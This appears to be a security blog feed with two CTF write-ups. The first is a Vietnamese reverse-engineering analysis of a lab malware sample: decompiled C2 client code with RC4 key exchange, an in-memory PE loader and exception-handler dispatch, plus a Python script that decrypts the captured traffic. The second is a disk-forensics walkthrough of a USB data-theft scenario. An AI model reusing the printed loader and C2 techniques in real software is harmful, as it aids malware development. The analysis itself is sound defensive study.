nếu getaddrinfo thất bại chương trình sẽ return về &lt;strong&gt;nonzero hay còn gọi là error code&lt;/strong&gt; sẽ đi tới LABEL_4
và dùng ExitProcess() để terminal chương trình.
nếu getaddrinfo thành công return 0
&lt;img src=&quot;https://hackmd.io/_uploads/SySXdWHA1g.png&quot; alt=&quot;image&quot; /&gt;
và trả về các object của struct attackInfo
tiếp theo chương trình sẽ tạo một socket với attackrinfo tại v2[116]
&lt;img src=&quot;https://hackmd.io/_uploads/SyJlcWr01x.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Nếu socket tạo thành công sẽ gọi functionName connect() từ ws2_32.dll đã resolved APIhash với v2[119]
và v2[120] có thể là closeconnect()
khi tạo thành công connect() chương trình đi tới LABLE_9 bắt đầu nhận và gửi payload thông qua socket này&lt;/p&gt;
&lt;h2&gt;tại LABEL_9&lt;/h2&gt;
&lt;p&gt;nhận diện các functioncall thông qua các parameter thông dụng
&lt;img src=&quot;https://hackmd.io/_uploads/BJGpkGS0Je.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;đầu tiên tại target nhận một key với buffer 512 từ attacker
filter wireshark : ip.addr==192.168.89.136 and tcp.srcport==31337
&lt;img src=&quot;https://hackmd.io/_uploads/ByWh3ZSRJe.png&quot; alt=&quot;image&quot; /&gt;
&lt;strong&gt;key nhận từ attacker : &quot;I&apos;m_4_Gat3_K33per&quot;&lt;/strong&gt;
target sẽ gửi lại cho attacker 1 byte payload = 4 (do tại bước này mình vẫn chưa hiểu attacker send 1 bytes này làm gì nên mình sẽ giải thích ở dưới sau nếu các bạn thắc mắc hãy kéo xuống dưới)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;send = resolve_APIhashing_ws2_32();
((void (__stdcall *)(_DWORD, unsigned int *, int, _DWORD))send[121])(send[100], &amp;amp;ss, 1, 0);// v29 = 4 (gửi 1 byte)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;theo dõi bên wireshark
filter wireshark : ip.addr==192.168.89.136 and tcp.dstport==31337
&lt;img src=&quot;https://hackmd.io/_uploads/HJWF3ZBRJg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;tiếp theo chương trình sử dụng hàm create_key_random((int) &amp;amp;savedregs)) với để tạo khóa&lt;/p&gt;
&lt;h2&gt;Create_key_random&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;int __usercall create_string@&amp;lt;eax&amp;gt;(int a1@&amp;lt;ebp&amp;gt;)
{
  int result; // eax
  unsigned int v2; // eax
  _BYTE *v3; // edi
  unsigned int i; // esi
  char v5[64]; // [esp-40h] [ebp-4Ch] BYREF
  int v6; // [esp+0h] [ebp-Ch]
  void *v7; // [esp+4h] [ebp-8h]
  void *retaddr; // [esp+Ch] [ebp+0h]

  v6 = a1;
  v7 = retaddr;
  result = dword_420360;
  if ( !dword_420360 )
  {
    v2 = time(0);
    srand(v2);
    strcpy(v5, &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;);
    v3 = malloc(0x40u);
    for ( i = 0; i &amp;lt; 0x40; ++i )
      v3[i] = v5[rand() % 52];
    v3[64] = 0;
    result = (int)v3;
    dword_420360 = (int)v3;
  }
  return result;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;hàm sẽ tạo khóa 64 bytes từ random char bằng cách lấy time hiện tại
và nó sẽ mã hóa key này với key mà attacker đã gửi đầu tiên và send độ dài key đã bị mã thông qua hàm RC4_send&lt;/p&gt;
&lt;h2&gt;chức năng hàm RC4_send()&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;void __fastcall RC4_sendEnc(int data, int lenkey, const char *key)
{
  size_t v4; // esi
  _BYTE *enc; // ebx
  _DWORD *send; // eax

  v4 = lenkey + 1;
  enc = malloc(lenkey + 1);
  memset(enc, 0, v4);
  if ( resolve_APIhashing_ws2_32()[100] != -1 )
  {
    rc4_encrypt(data, lenkey, (int)key, strlen(key), enc);
    send = resolve_APIhashing_ws2_32();
    ((void (__stdcall *)(_DWORD, _BYTE *, int, _DWORD))send[121])(send[100], enc, lenkey, 0);
    Sleep(30u);
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;nó sẽ dùng rc4 để encrypt và sử dụng resolve_APIhashing_ws2_32() để lấy functionName : send() từ ws2_32.dll chức năng của hàm resolve_APIhashing_ws2_32 mình đã đề cập ở trên
đây là payload đã send 4bytes len của key và ngay sau đó là key
ban đầu tại đây mình nghĩ sẽ tạo ra 2 packet trên file pcapng và mình kh thấy packet nào hợp lệ sau khoảng thời gian mình nhận ra nó đã đc gửi cùng với nhau trong 1 packet và đây là payload của nó
&lt;img src=&quot;https://hackmd.io/_uploads/BJ3oeGBCyl.png&quot; alt=&quot;image&quot; /&gt;
vì đây là packet t2 sau khi send 0x04
payload có 68bytes : chia ra 2 phần&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;encrypted-key-length :86dad7bb 
encrypted-key : 918e87d161556ad2e40a89010adfe3aa41ca44764e786b738047456cc80d021e7f60b56776b858225d45099f0e99b62f5758977fde740bcc2be36dbf403eb860
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;đã có đầy đủ thông tin về key và tiến hành xử lý decrypt RC4&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sizekey = 0x40 = 64bytes đúng với logic tạo key
key = &quot;WTPjWbJafqNPqrZFswaijmyVKMddOrKzukegbVDpXJqDfulPDmDwDasqTwxvibnM&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HJyeQzSRJe.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;có key rồi decrypt luôn payload tiếp theo đã đc gửi từ attacker tới target đầu tiên là len data tiếp theo là data và sau đó bị encrypted bởi rc4_encrypt sau đó có vẻ như nó load file này vào memory và chạy file&lt;/p&gt;
&lt;h2&gt;Load file Drop (chức năng tinh chỉnh key)&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;    recv2 = resolve_APIhashing_ws2_32();
    if ( !((int (__stdcall *)(_DWORD, void *, int, _DWORD))recv2[122])(recv2[100], v18, v19, 0) )// data file dll đã bị encrypted
    {
      recv2[100] = 0;
      *((_BYTE *)recv2 + 496) = 0;
    }
    lenkey = strlen((const char *)create_key_random((int)&amp;amp;savedregs));
    v21 = fileDLLdrop;
    dataencRecv = *(_BYTE **)(fileDLLdrop + 8);
    keyDecryptData = create_key_random((int)&amp;amp;savedregs);
    rc4_encrypt(*(_DWORD *)(v21 + 8), *(_DWORD *)(v21 + 4), keyDecryptData, lenkey, dataencRecv);// *(dword_4203B4+4) = key &amp;amp;&amp;amp; *(dword_4203B4+8) = data
    v23 = (int *)fileDLLdrop;
    handle = LoadDLL(*(_DWORD *)(v21 + 8), *(_DWORD *)(v21 + 4));
    *v23 = handle;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;chức năng của hàm LoadDLL là load một file dll,exe vào memory như một dạng PELoader.
và return về một dạng handler
kỹ thuật này được gọi là Virtual Machine-based PE Loader
trả về một con trỏ (pointer) đến Entry Point hoặc Base Address của PE đã được map vào bộ nhớ.
và attacker sẽ import manual các functionName của file PE này vào sử dụng&lt;/p&gt;
&lt;p&gt;sau khi PEloader thành công attacker đã tạo một file BMP
và sau đó gửi size của file
&lt;img src=&quot;https://hackmd.io/_uploads/By4ocMrCkg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;do thời gian gửi payload chênh lệch rất ít nên hàm tạo khóa sẽ cho ra các khóa giống nhau&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;filter wirshark : ip.addr==192.168.89.136 and tcp.dstport==51392 and tcp.srcport==31337
với gửi len data ở gói packetid == 10
và data ở gói packetid == 11 trở đi để thuận tiện ta sẽ lấy payload ở TCP stream
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BJoXPGH01e.png&quot; alt=&quot;image&quot; /&gt;
download file về&lt;/p&gt;
&lt;h2&gt;AddVectoredExceptionHandler&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/H14ejMSRkl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;dword_42039C nó là một APIwindows AddVectoredExceptionHandler
một dạng bắn ExceptionCode để xử lý logic code thật
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rJBwXEH0yl.png&quot; alt=&quot;image&quot; /&gt;
sau khi fix&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;LONG __stdcall Handler(struct _EXCEPTION_POINTERS *ExceptionInfo)
{
  DWORD ExceptionCode; // eax
  _DWORD *v2; // eax
  _DWORD *recv; // esi
  void *v5; // edx
  PCONTEXT ContextRecord; // eax
  DWORD Eip; // ecx
  DWORD v8; // ecx
  char v9; // [esp+13h] [ebp-1h] BYREF

  if ( resolve_APIhashing_ws2_32()[100] == -1 || !*(_DWORD *)fileDLLdrop )
  {
    ExceptionInfo-&amp;gt;ContextRecord-&amp;gt;Eip += 5;
    return -1;
  }
  ExceptionCode = ExceptionInfo-&amp;gt;ExceptionRecord-&amp;gt;ExceptionCode;
  if ( ExceptionCode == 0xC0000005 )            // exception code
  {
    v2 = (_DWORD *)dword_8A0394;
    qmemcpy(dword_8A0398, ExceptionInfo-&amp;gt;ContextRecord, 716u);
    if ( dataPic &amp;lt;= (int)(*v2 / (unsigned int)lendataEnc) )
    {
      recv = resolve_APIhashing_ws2_32();
      if ( !((int (__stdcall *)(_DWORD, char *, int, _DWORD))recv[122])(recv[100], &amp;amp;v9, 1, 0) )
      {
        recv[100] = 0;
        *((_BYTE *)recv + 496) = 0;
      }
      switch ( v9 )                             // nhận data option tu attacker
      {                                         // cac case nay se goi ham cua file DLLdrop
        case 0:
          ExceptionInfo-&amp;gt;ContextRecord-&amp;gt;Eip = (DWORD)gen0;// gán địa chỉ gen0 cho EIP để thực thi tiếp tục tại địa chỉ đó
          return -1;
        case 1:
          ExceptionInfo-&amp;gt;ContextRecord-&amp;gt;Eip = (DWORD)gen1;
          return -1;
        case 2:
          ExceptionInfo-&amp;gt;ContextRecord-&amp;gt;Eip = (DWORD)gen2;
          return -1;
        case 3:
          ExceptionInfo-&amp;gt;ContextRecord-&amp;gt;Eip = (DWORD)gen3;
          return -1;
      }
    }
    return -1;
  }
  if ( ExceptionCode != 0x80000003 )
    return -1;
  v5 = dword_8A0398;
  if ( !*((_DWORD *)dword_8A0398 + 46) )
    return -1;
  qmemcpy(ExceptionInfo-&amp;gt;ContextRecord, dword_8A0398, sizeof(CONTEXT));
  ContextRecord = ExceptionInfo-&amp;gt;ContextRecord;
  Eip = ContextRecord-&amp;gt;Eip;
  if ( lendataEnc )
    v8 = Eip - 2;
  else
    v8 = Eip + 5;
  ContextRecord-&amp;gt;Eip = v8;
  memset(v5, 0, 716u);
  return -1;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;Solution&lt;/h2&gt;
&lt;p&gt;Trong Windows ta có thể chúng ta có thể bắt Exception và trỏ EIP tới một địa chỉ hàm mà ta mong muốn và thực thi tiếp logic code tại đó
Các EIP được gán cho địa chỉ của gen0-gen3 (các hàm này bạn có thể xem ở file drop)
Solution:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Target sẽ nhận 1 key từ attacker&lt;/li&gt;
&lt;li&gt;Sau đó dùng key đó để làm key cho một key dùng để encrypt-decrypt payload và key này được tạo thông qua hàm create_random_string()&lt;/li&gt;
&lt;li&gt;Download một file exe/dll về máy target và dùng key(được tạo từ hàm random) để decrypting&lt;/li&gt;
&lt;li&gt;Load Dll vào program và sử dụng các hàm của nó (gen0-gen3) để customkey, Tạo một file bmp&lt;/li&gt;
&lt;li&gt;Thêm một các vectorException và gán EIP cho các hàm gen0-gen3 mỗi lần nhận option từ attacker thì target sẽ gửi lại size payload và chạy switch-case theo từng option phù hợp để tạo customkey , mã hóa và send payload cho attacker.
script solve.py&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;
from scapy.all import rdpcap, Raw,IP,TCP

def rc4_decrypt(key: bytes, data: bytes) -&amp;gt; bytes:
    S = list(range(256))
    j = 0
    out = bytearray()

    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    i = j = 0
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) % 256]
        out.append(byte ^ K)

    return bytes(out)

def gen0_customKey(key: bytes) -&amp;gt; bytes:
    return key[::-1]

def gen1_customKey(key: bytes) -&amp;gt; bytes:
    s = key.decode()
    flipped = &apos;&apos;
    for c in s:
        if c.islower():
            flipped += c.upper()
        elif c.isupper():
            flipped += c.lower()
        else:
            flipped += c
    return flipped.encode()

def gen2_customKey(key: bytes) -&amp;gt; bytes:
    return key[-1:] + key[:-1]

def gen3_customKey(key: bytes) -&amp;gt; bytes:
    result = bytearray()
    for b in key:
        if 65 &amp;lt;= b &amp;lt;= 90:  # &apos;A&apos; - &apos;Z&apos;
            v = ((b - 52) % 26) + 65
        elif 97 &amp;lt;= b &amp;lt;= 122:  # &apos;a&apos; - &apos;z&apos;
            v = ((b - 84) % 26) + 97
        else:
            v = b
        result.append(v)
    return bytes(result)


initialKey = b&quot;WTPjWbJafqNPqrZFswaijmyVKMddOrKzukegbVDpXJqDfulPDmDwDasqTwxvibnM&quot;

packets = rdpcap(&quot;record.pcapng&quot;)
pic = b&quot;&quot;
payload = b&quot;&quot;
option = []
size = []
for packet in packets[24:]:
    if IP in packet and TCP in packet:
        src = packet[IP].src
        dst = packet[IP].dst
        if src == &quot;192.168.89.136&quot; and dst == &quot;192.168.89.1&quot;:
            if Raw in packet:
                option.append(packet[Raw].load)
                if(len(option) &amp;gt;= 2):
                    match option[-2]:
                        case b&apos;\x00&apos;:
                            key = gen0_customKey(initialKey)
                            pic += rc4_decrypt(key,payload)
                        case b&apos;\x01&apos;:
                            key = gen1_customKey(initialKey)
                            pic += rc4_decrypt(key,payload)
                        case b&apos;\x02&apos;:
                            key = gen2_customKey(initialKey)
                            pic += rc4_decrypt(key,payload)
                        case b&apos;\x03&apos;:
                            key = gen3_customKey(initialKey)
                            pic += rc4_decrypt(key,payload)
                    
                    payload = b&apos;&apos;
            else: continue
        elif src == &quot;192.168.89.1&quot; and dst == &quot;192.168.89.136&quot;:
            if Raw in packet:
                raw_data = packet[Raw].load
                if len(raw_data) == 4:
                    if(len(option) &amp;gt;= 2):
                        match option[-1]:
                            case b&apos;\x00&apos;:
                                key = gen0_customKey(initialKey)
                                size.append(rc4_decrypt(key,packet[Raw].load))
                            case b&apos;\x01&apos;:
                                key = gen1_customKey(initialKey)
                                size.append(rc4_decrypt(key,packet[Raw].load))
                            case b&apos;\x02&apos;:
                                key = gen2_customKey(initialKey)
                                size.append(rc4_decrypt(key,packet[Raw].load))
                            case b&apos;\x03&apos;:
                                key = gen3_customKey(initialKey)
                                size.append(rc4_decrypt(key,packet[Raw].load))
                    
                else:
                    payload += raw_data
for i in range(len(size)):
    print(f&quot;size payload của option {option[i]}: {size[i]}&quot;)
with open(&quot;pic.bmp&quot;, &quot;wb&quot;) as f:
    f.write(pic)



&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SyEdvv0Rkg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;PS: Cảm ơn mọi người đã đọc và cảm ơn author vì qua challenge này mình học thêm được rất nhiều thứ mới lạ.&lt;/p&gt;
</content:encoded></item><item><title>Diskfiltrate</title><link>https://bruning-frighting.github.io/KAiZ3nThong/posts/diskfiltrate/</link><guid isPermaLink="true">https://bruning-frighting.github.io/KAiZ3nThong/posts/diskfiltrate/</guid><pubDate>Thu, 17 Apr 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;DiskFiltration&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;author: KAiZ3n
Category : DFIR Live Endpoint
Artifact: C:\Users\Administrator\Documents\New Folder\Liam&apos;s Disk
Description:
Tech THM discovered their critical data had been leaked to the competitors. After an internal investigation, the company suspects Liam, a recently terminated employee who was working as a system engineer with Tech THM. This suspicion was raised as Liam had access to the leaked data in his company-provided workstation. He often worked late hours without clear justification for his extended presence. He was also caught roaming around the critical server room and taking pictures of the entry gate. Following these suspicions, Liam’s workstation (provided by the company) was investigated. The initial investigation suggests that an external entity was also helping Liam.
&lt;img src=&quot;https://hackmd.io/_uploads/ryYEYpSyxl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Question 1: What is the serial number of the USB device Liam used for exfiltration?&lt;/h2&gt;
&lt;p&gt;check file disk.E01 with autopsy
USB details Information
HKLM\SYSTEM\ControlSet001\Enum\USBTOR\ --&amp;gt; Serial Number : 2651931097993496666 , DiskID : {de87ecc0-d706-11ef-beb9-000c29b3a97f}&lt;/p&gt;
&lt;p&gt;HKLM\SYSTEM\MountedDevices??\Volume{de87ecc0-d706-11ef-beb9-000c29b3a97f}&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;\DosDevices\E:
USB đc mount vào ở E&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Question 2: What is the profile name of the personal hotspot Liam used to evade network-level detection?&lt;/h2&gt;
&lt;p&gt;Check registry hive : HKLM\SOFTWARE\&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Answer: Liam&apos;s Iphone&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Question 3:What is the name of the zip file Liam copied from the USB to the machine for exfiltration instructions?&lt;/h2&gt;
&lt;p&gt;Check data transfer between USB and disk
After identifying that the USB is mounted to drive E, check the RecentDocs in Autopsy to see if there are any suspicious files belonging to E:.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SynGtAHJxx.png&quot; alt=&quot;image&quot; /&gt;
Access the path to check: /img_dis.E01/vol_vol3/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/AutomaticDestinations/f01b4d95cf55d32a.automaticDestinations-ms/Exfiltration Plan.lnk
Using LECmd.exe to check, this .lnk file points to the folder E:\Exfiltration Plan.&lt;/p&gt;
&lt;p&gt;Information LNK folder Exfiltration Plan&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Processing D:\CTFchall\tools\Exfiltration Plan.lnk

Source file: D:\CTFchall\tools\Exfiltration Plan.lnk
  Source created:  2025-04-23 03:13:38
  Source modified: 2025-04-23 03:13:04
  Source accessed: 2025-04-23 04:22:48

--- Header ---
  Target created:  2025-01-18 08:27:03
  Target modified: 2025-01-29 11:04:04
  Target accessed: 2025-01-29 11:04:07

  File size (bytes): 0
  Flags: HasTargetIdList, HasLinkInfo, IsUnicode, DisableKnownFolderTracking, AllowLinkToLink
  File attributes: FileAttributeDirectory
  Icon index: 0
  Show window: SwNormal (Activates and displays the window. The window is restored to its original size and position if the window is minimized or maximized.)


--- Link information ---
Flags: VolumeIdAndLocalBasePath

&amp;gt;&amp;gt; Volume information
  Drive type: Removable storage media (Floppy, USB)
  Serial number: 66D6D7DD
  Label: Liam&apos;s USB
  Local path: E:\Exfiltration Plan

--- Target ID information (Format: Type ==&amp;gt; Value) ---

  Absolute path: This PC\E:\Exfiltration Plan

  -Root folder: GUID ==&amp;gt; This PC

  -Drive letter ==&amp;gt; E:

  -Directory ==&amp;gt; Exfiltration Plan
    Short name: Exfiltration Plan
    Modified:    2025-01-29 11:04:06
    Extension block count: 1

    --------- Block 0 (Beef0004) ---------
    Long name: Exfiltration Plan
    Created:     2025-01-18 08:27:04
    Last access: 2025-01-29 11:04:08
    MFT entry/sequence #: 39/6 (0x27/0x6)

--- End Target ID information ---

--- Extra blocks information ---

&amp;gt;&amp;gt; Tracker database block
   Machine ID:  win-tssjnps56jv
   MAC Address: 98:fa:9b:4c:20:39
   MAC Vendor:  LCFC
   Creation:    2025-01-16 12:10:59

   Volume Droid:       00000000-0000-0000-0000-000000000000
   Volume Droid Birth: 00000000-0000-0000-0000-000000000000
   File Droid:         f280157e-d402-11ef-93d4-98fa9b4c2039
   File Droid birth:   f280157e-d402-11ef-93d4-98fa9b4c2039

&amp;gt;&amp;gt; Property store data block (Format: GUID\ID Description ==&amp;gt; Value)
   9f4c2855-9f79-4b39-a8d0-e1d42de1d5f3\7      App User Model Is DestList Link     ==&amp;gt; True
   446d16b1-8dad-4870-a748-402ea43d788c\104    Volume Id                           ==&amp;gt; Unmapped GUID: de87ecc0-d706-11ef-beb9-000c29b3a97f


---------- Processed D:\CTFchall\tools\Exfiltration Plan.lnk in 0.19707700 seconds ----------
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Here is LNK information of Shadow_plan.lnk&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Processing D:\CTFchall\tools\Shadow_Plan.lnk

Source file: D:\CTFchall\tools\Shadow_Plan.lnk
  Source created:  2025-04-23 04:16:56
  Source modified: 2025-04-23 04:15:58
  Source accessed: 2025-04-23 04:17:14

--- Header ---
  Target created:  2025-01-29 11:18:59
  Target modified: 2025-01-29 11:19:00
  Target accessed: 2025-01-29 11:19:00

  File size (bytes): 4,096
  Flags: HasTargetIdList, HasLinkInfo, HasRelativePath, IsUnicode, DisableKnownFolderTracking
  File attributes: FileAttributeDirectory
  Icon index: 0
  Show window: SwNormal (Activates and displays the window. The window is restored to its original size and position if the window is minimized or maximized.)

Relative Path: ..\..\..\..\..\Desktop\Shadow_Plan
--- Link information ---
Flags: VolumeIdAndLocalBasePath

&amp;gt;&amp;gt; Volume information
  Drive type: Fixed storage media (Hard drive)
  Serial number: F47DB76F
  Label: (No label)
  Local path: C:\Users\Administrator\Desktop\Shadow_Plan

--- Target ID information (Format: Type ==&amp;gt; Value) ---

  Absolute path: Shadow_Plan

  -Directory ==&amp;gt; Shadow_Plan
    Short name: SHADOW~1

    --------- Block 0 (Beef0004) ---------
    Long name: Shadow_Plan
    Created:     2025-01-29 11:19:00
    Last access: 2025-01-29 11:19:02
    MFT entry/sequence #: 129918/4 (0x1FB7E/0x4)

--- End Target ID information ---

--- Extra blocks information ---

&amp;gt;&amp;gt; Tracker database block
   Machine ID:  win-tssjnps56jv
   MAC Address: 00:0c:29:b3:a9:7f
   MAC Vendor:  VMWARE
   Creation:    2025-01-20 08:16:37

   Volume Droid:       19932c3c-be4d-4049-9724-fd6d3e9d6ce7
   Volume Droid Birth: 19932c3c-be4d-4049-9724-fd6d3e9d6ce7
   File Droid:         de87ecd0-d706-11ef-beb9-000c29b3a97f
   File Droid birth:   de87ecd0-d706-11ef-beb9-000c29b3a97f

&amp;gt;&amp;gt; Property store data block (Format: GUID\ID Description ==&amp;gt; Value)
   446d16b1-8dad-4870-a748-402ea43d788c\104    Volume Id                           ==&amp;gt; Unmapped GUID: 31ace70e-0000-0000-0000-602200000000


---------- Processed D:\CTFchall\tools\Shadow_Plan.lnk in 0.19649880 seconds ----------
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;With the Property Store Data Block:
446d16b1-8dad-4870-a748-402ea43d788c\104 Volume Id ==&amp;gt; Unmapped GUID: de87ecc0-d706-11ef-beb9-000c29b3a97f&lt;/p&gt;
&lt;p&gt;And the LNK information of Shadow_plan.lnk and Property Store Data Block:
446d16b1-8dad-4870-a748-402ea43d788c\104 Volume Id ==&amp;gt; Unmapped GUID: 31ace70e-0000-0000-0000-602200000000&lt;/p&gt;
&lt;p&gt;As a result, both GUIDs on the original disk for the Exfiltration Plan and Shadow_Plan folder are the same, with only the Unmapped GUID being different. This indicates that Shadow_Plan was copied to the Exfiltration Plan.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Answer: Shadow_plan.zip&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Question 4:What is the password for this zip file?&lt;/h2&gt;
&lt;p&gt;checking pass.lnk&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Source file: D:\CTFchall\tools\Pass.lnk
  Source created:  2025-04-23 04:16:56
  Source modified: 2025-04-23 04:16:40
  Source accessed: 2025-04-23 04:38:13

--- Header ---
  Target created:  2025-01-20 07:51:49
  Target modified: 2025-01-20 07:51:49
  Target accessed: 2025-01-20 07:51:49

  File size (bytes): 10
  Flags: HasTargetIdList, HasLinkInfo, HasRelativePath, HasWorkingDir, IsUnicode, DisableKnownFolderTracking
  File attributes: FileAttributeArchive
  Icon index: 0
  Show window: SwNormal (Activates and displays the window. The window is restored to its original size and position if the window is minimized or maximized.)

Relative Path: ..\..\..\..\..\Documents\Pass.txt
Working Directory: C:\Users\Administrator\Documents

--- Link information ---
Flags: VolumeIdAndLocalBasePath

&amp;gt;&amp;gt; Volume information
  Drive type: Fixed storage media (Hard drive)
  Serial number: F47DB76F
  Label: (No label)
  Local path: C:\Users\Administrator\Documents\Pass.txt

--- Target ID information (Format: Type ==&amp;gt; Value) ---

  Absolute path: This PC\Documents\Pass.txt

  -Root folder: GUID ==&amp;gt; This PC

  -Root folder: GUID ==&amp;gt; Documents

  -File ==&amp;gt; Pass.txt
    Short name: Pass.txt
    Modified:    2025-01-20 07:51:50
    Extension block count: 1

    --------- Block 0 (Beef0004) ---------
    Long name: Pass.txt
    Created:     2025-01-20 07:51:50
    Last access: 2025-01-20 07:51:50
    MFT entry/sequence #: 132605/1 (0x205FD/0x1)

--- End Target ID information ---

--- Extra blocks information ---

&amp;gt;&amp;gt; Tracker database block
   Machine ID:  win-tssjnps56jv
   MAC Address: 00:0c:29:b3:a9:7f
   MAC Vendor:  VMWARE
   Creation:    2025-01-20 07:17:11

   Volume Droid:       19932c3c-be4d-4049-9724-fd6d3e9d6ce7
   Volume Droid Birth: 19932c3c-be4d-4049-9724-fd6d3e9d6ce7
   File Droid:         910782f9-d6fe-11ef-beb8-000c29b3a97f
   File Droid birth:   910782f9-d6fe-11ef-beb8-000c29b3a97f

&amp;gt;&amp;gt; Property store data block (Format: GUID\ID Description ==&amp;gt; Value)
   446d16b1-8dad-4870-a748-402ea43d788c\104    Volume Id                           ==&amp;gt; Unmapped GUID: 31ace70e-0000-0000-0000-602200000000
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Local path: C:\Users\Administrator\Documents\Pass.txt
check this file for pasword unzip file Shadow_Plan.zip&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Answer: Qwerty@123&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Question 5:Time to reveal the external entity helping Liam! Who is the author of the PDF file stored in the zip file?&lt;/h2&gt;
&lt;p&gt;Conducting unzip file with password and check signature metadata của file pdf&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rk-hZgL1eg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Answer: Henry&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Question 6:What is the correct extension of the file that has no extension in the zip folder?&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;file confidential 
confidential: PNG image data, 800 x 600, 8-bit/color RGB, non-interlaced

&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;Answer: png&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Question 6:It looks like Liam searched for some files inside the file explorer. What are the names of these files? (alphabetical order)&lt;/h2&gt;
&lt;p&gt;Artifact :\Users\Administrator\NTUSER.DAT\Software\Windows\Microsoft\CurrentVersion\Explorer\WordWheelQuery&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Answer: Financial,Revenue&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Question 7: What are the names of the folders that were present on the USB device? (alphabetical order)&lt;/h2&gt;
&lt;p&gt;At the Question 1, we identified to USB mounting into E:\ on local Disk
the one of them which we found out in Question 3 : E:\Exfiltration Plan
the other which we&apos;ll check it in RecentDocs of  AutoPsy
&lt;img src=&quot;https://hackmd.io/_uploads/rk5KBx8kel.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;--- Header ---
  Target created:  2025-01-18 08:28:07
  Target modified: 2025-01-29 11:20:44
  Target accessed: 2025-01-29 11:20:44

  File size (bytes): 0
  Flags: HasTargetIdList, HasLinkInfo, IsUnicode, DisableKnownFolderTracking, AllowLinkToLink
  File attributes: FileAttributeDirectory
  Icon index: 0
  Show window: SwNormal (Activates and displays the window. The window is restored to its original size and position if the window is minimized or maximized.)


--- Link information ---
Flags: VolumeIdAndLocalBasePath

&amp;gt;&amp;gt; Volume information
  Drive type: Removable storage media (Floppy, USB)
  Serial number: 66D6D7DD
  Label: Liam&apos;s USB
  Local path: E:\Critical Data TECH THM

--- Target ID information (Format: Type ==&amp;gt; Value) ---

  Absolute path: This PC\E:\Critical Data TECH THM

  -Root folder: GUID ==&amp;gt; This PC

  -Drive letter ==&amp;gt; E:

  -Directory ==&amp;gt; Critical Data TECH THM
    Short name: Critical Data TECH THM
    Modified:    2025-01-29 11:20:46
    Extension block count: 1

    --------- Block 0 (Beef0004) ---------
    Long name: Critical Data TECH THM
    Created:     2025-01-18 08:28:08
    Last access: 2025-01-29 11:20:46
    MFT entry/sequence #: 40/5 (0x28/0x5)

--- End Target ID information ---

--- Extra blocks information ---

&amp;gt;&amp;gt; Tracker database block
